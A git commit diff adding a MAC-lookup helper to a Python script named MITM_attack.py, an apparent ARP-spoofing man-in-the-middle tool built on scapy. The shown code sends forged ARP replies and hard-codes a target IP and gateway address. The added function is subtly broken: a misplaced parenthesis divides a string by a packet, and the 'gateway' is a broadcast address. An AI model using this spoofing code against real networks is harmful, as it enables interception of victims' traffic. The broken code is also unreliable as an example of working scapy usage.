87c263f0e9c5294687d7850691cd53c1d7342c69
Itamar75 <itamarkoren1@gmail.com>
2025-07-11 15:38:12 +0300

    creating a function that gets mac adress from ip

--- MITM_attack.py
+++ MITM_attack.py
@@ -4,5 +4,13 @@ def spoof(target_ip, target_mac, spoof_ip):
     ARP_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
     scapy.send(ARP_packet)
 
+def get_mac(ip):
+    arp_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff"/scapy.ARP(pdst = ip))
+    reply, x = scapy.srp(arp_request, timeout = 5, verbose = 0)
+    if reply:
+        return reply[0][1].src
+    return None
+
 default_gateway = "192.168.137.255"
 target_ip = "213.57.182.162"
+
